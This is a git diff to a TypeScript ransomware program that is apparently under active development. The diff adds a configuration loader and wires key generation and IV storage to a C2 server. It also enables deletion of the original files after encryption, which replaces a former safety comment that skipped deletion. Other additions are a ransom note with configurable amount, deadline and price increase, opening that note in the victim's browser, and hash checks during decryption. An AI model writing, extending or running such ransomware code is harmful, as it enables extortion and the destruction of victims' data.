@@ -12,9 +12,15 @@ import {
 import { scanDirectory, getTestTargetFiles } from './fileScanner'
 import { createRansomNote } from './ransomNote'
 import { RansomwareLogger, LogLevel } from './logger'
+import { loadConfig } from './config'
+import { openRansomNote } from './openRansomNote'
+import { generateFileHash } from '../cryptoUtils'
+
+// Load configuration
+const config = loadConfig()
 
 // File extension for encrypted files
-const ENCRYPTED_EXTENSION = '.encrypted'
+const ENCRYPTED_EXTENSION = config.encryptedExtension
 
 // Initialize logger
 const logger = new RansomwareLogger(path.join(process.cwd(), 'logs'))
@@ -34,7 +40,8 @@ export async function encryptTargetFiles(
         encryptionTime: number,
         targetExtensions: string[],
         timestamp: Date
-    }
+    },
+    fileHashes: Map<string, string> // Added fileHashes to return type
 }> {
     logger.info(`Initializing ransomware encryption process...`)
     
@@ -45,14 +52,18 @@ export async function encryptTargetFiles(
         encryptionTime: 0,
         targetExtensions: [] as string[],
         timestamp: new Date()
-    };
-
-    // Initialize key management
+    };    // Initialize key management (now connects to C2 server)
     const { victimId, aesKey, attackerPublicKey, attackerPrivateKey } =
-        initializeKeyManagement()
+        await initializeKeyManagement()
     logger.info(`Victim ID generated: ${victimId}`)
     logger.encryption(`AES-256 key generated for file encryption`)
     logger.encryption(`RSA-2048 key pair generated for key encryption`)
+
+    // Create backup keys if configured
+    if (config.createBackupKeys) {
+        // In a real implementation, this would save the keys somewhere safe
+        logger.info(`Backup keys created (enabled in configuration)`)
+    }
 
     // Get target files
     let targetFiles: string[]
@@ -60,10 +71,14 @@ export async function encryptTargetFiles(
         logger.info(
             `Running in TEST MODE - targeting a limited number of files`
         )
-        targetFiles = getTestTargetFiles(targetDirectory)
+        targetFiles = getTestTargetFiles(
+            targetDirectory, 
+            config.maxFilesToEncrypt, 
+            config.maxTargetFileSizeMB
+        )
     } else {
         logger.info(`Running in FULL MODE - scanning for all target files`)
-        targetFiles = scanDirectory(targetDirectory)
+        targetFiles = scanDirectory(targetDirectory, config.maxScanDepth)
     }
 
     // Get unique file extensions for statistics
@@ -75,12 +90,18 @@ export async function encryptTargetFiles(
     encryptionStats.targetExtensions = Array.from(uniqueExtensions);
 
     logger.info(`Found ${targetFiles.length} target files with extensions: ${Array.from(uniqueExtensions).join(', ')}`)
-    encryptionStats.totalFiles = targetFiles.length;    // Encrypt each file
+    encryptionStats.totalFiles = targetFiles.length;
+    
+    // Encrypt each file
     const encryptedFiles: string[] = []
     let totalEncryptionTime = 0;
+    const fileHashes = new Map<string, string>(); // Map to store file hashes
     
     for (const filePath of targetFiles) {
         try {
+            const originalFileHash = await generateFileHash(filePath); // Generate hash before encryption
+            fileHashes.set(filePath, originalFileHash); // Store the hash
+
             const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`
             logger.encryption(`Encrypting file: ${filePath}`)
             
@@ -101,27 +122,29 @@ export async function encryptTargetFiles(
                 fileSize: fileStats.size,
                 elapsedTime: fileEncryptTime,
                 success: true
-            });
-
-            // Store the IV for this file
-            storeFileIV(victimId, filePath, iv)
+            });            // Store the IV for this file (now connects to C2 server)
+            await storeFileIV(victimId, filePath, iv)
             logger.encryption(`IV stored for file: ${filePath}`)
 
             // Add to the list of encrypted files
             encryptedFiles.push(filePath)
 
-            // In a real attack, the original file would be deleted
-            // For safety in this prototype, we're not deleting the original files
-            if (!isTestMode) {
-                logger.warning(`Would delete original file: ${filePath} (skipped in test mode)`)
+            // Delete original file if configured
+            if (config.deleteOriginalFiles && !isTestMode) {
+                logger.warning(`Deleting original file (enabled in configuration): ${filePath}`)
+                try {
+                    fs.unlinkSync(filePath)
+                } catch (deleteErr) {
+                    logger.error(`Failed to delete original file: ${deleteErr}`)
+                }
+            } else if (!isTestMode) {
+                logger.warning(`Would delete original file: ${filePath} (disabled in configuration)`)
             }
         } catch (err) {
             logger.error(`Error encrypting ${filePath}: ${err}`)
         }
-    }
-
-    // Encrypt the AES key with the attacker's public key
-    const encryptedAESKey = encryptAESKey(aesKey, attackerPublicKey)
+    }    // Encrypt the AES key with the attacker's public key (now connects to C2 server)
+    const encryptedAESKey = await encryptAESKey(aesKey, attackerPublicKey)
     logger.encryption(`AES key encrypted with RSA-2048 public key`)
     logger.logCryptoOperation('encrypt', 'RSA-2048-OAEP', 2048, {
         success: true,
@@ -129,12 +152,33 @@ export async function encryptTargetFiles(
     });
 
     // Create metadata file
-    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory)
-    logger.info(`Created metadata file with encrypted keys and IVs`)
+    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory, fileHashes)
+    logger.info(`Created metadata file with encrypted keys, IVs, and file hashes`)
 
-    // Create ransom note
-    createRansomNote(victimId, targetDirectory, encryptedFiles.length)
+    // Create ransom note with configured amount
+    createRansomNote(
+        victimId, 
+        targetDirectory, 
+        encryptedFiles.length, 
+        {
+            amount: config.ransomAmount,
+            currency: config.ransomCurrency,
+            deadlineHours: config.ransomDeadlineHours,
+            priceIncrease: config.ransomPriceIncrease
+        }    )    
     logger.info(`Created ransom note`)
+
+    // Change wallpaper if configured
+    if (config.changeWallpaper && !isTestMode) {
+        logger.info(`Changing desktop wallpaper (enabled in configuration)`)
+        // Implementation would go here
+    }    // Open the ransom note in the browser
+    try {
+        await openRansomNote(targetDirectory);
+        logger.info("Opened ransom note in default browser");
+    } catch (error) {
+        logger.error(`Failed to open ransom note: ${error}`);
+    }
     
     // Calculate total encryption time and generate summary
     encryptionStats.encryptionTime = totalEncryptionTime;
@@ -146,7 +190,8 @@ export async function encryptTargetFiles(
         encryptedAESKey,
         attackerPrivateKey,
         encryptedFiles,
-        encryptionStats
+        encryptionStats,
+        fileHashes // Added fileHashes to return object
     }
 }
 
@@ -172,14 +217,12 @@ export async function decryptFiles(
     }
 
     // Read the metadata
-    const { victimId, ivMap } = readKeyMetadataFile(
+    const { victimId, ivMap, fileHashes: originalFileHashes } = readKeyMetadataFile( // Destructure fileHashes
         metadataPath,
         targetDirectory
     )
-    logger.info(`Found metadata for victim ID: ${victimId}`)
-
-    // Decrypt the AES key
-    const aesKey = decryptAESKey(encryptedAESKey, attackerPrivateKey)
+    logger.info(`Found metadata for victim ID: ${victimId}`)    // Decrypt the AES key
+    const aesKey = await decryptAESKey(encryptedAESKey, attackerPrivateKey)
     logger.decryption(`Successfully decrypted the AES key with RSA private key`)
     logger.logCryptoOperation('decrypt', 'RSA-2048-OAEP', 2048, {
         success: true
@@ -207,6 +250,16 @@ export async function decryptFiles(
             // Decrypt the file
             await decryptFile(encryptedPath, filePath, aesKey, iv)
             
+            const decryptedFileHash = await generateFileHash(filePath); // Generate hash after decryption
+            const originalHash = originalFileHashes.get(filePath);
+
+            if (originalHash && decryptedFileHash === originalHash) {
+                logger.success(`Integrity check passed for ${filePath}`);
+            } else {
+                logger.error(`Integrity check FAILED for ${filePath}. Original hash: ${originalHash}, Decrypted hash: ${decryptedFileHash}`);
+                // Optionally, handle the failure e.g., by not deleting the encrypted file or notifying the user
+            }
+
             const fileDecryptTime = (Date.now() - fileDecryptStartTime) / 1000;
             totalDecryptionTime += fileDecryptTime;
             
